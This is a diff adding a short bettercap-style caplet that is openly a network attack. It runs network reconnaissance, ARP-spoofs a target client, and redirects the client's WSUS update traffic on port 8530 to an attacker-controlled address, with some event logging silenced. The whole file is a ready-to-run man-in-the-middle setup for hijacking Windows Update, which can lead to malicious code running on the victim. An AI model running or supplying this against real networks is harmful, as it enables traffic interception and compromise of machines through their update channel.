@@ -1,0 +1,24 @@
+# Quick recon of the network
+net.probe on
+
+# Set the ARP spoofing
+set arp.spoof.targets $CLIENT_IP
+set arp.spoof.internal false
+set arp.spoof.fullduplex false
+
+# Re-route traffic aimed at the WSUS server
+set any.proxy.iface $INTERFACE
+set any.proxy.protocol TCP
+set any.proxy.src_address $WSUS_SERVER_IP
+set any.proxy.src_port 8530
+set any.proxy.dst_address $ATTACKER_IP
+set any.proxy.dst_port 8530
+
+# Control logging and verbosity
+events.ignore endpoint
+events.ignore net.sniff
+
+# Start the modules
+any.proxy on
+arp.spoof on
+net.sniff on
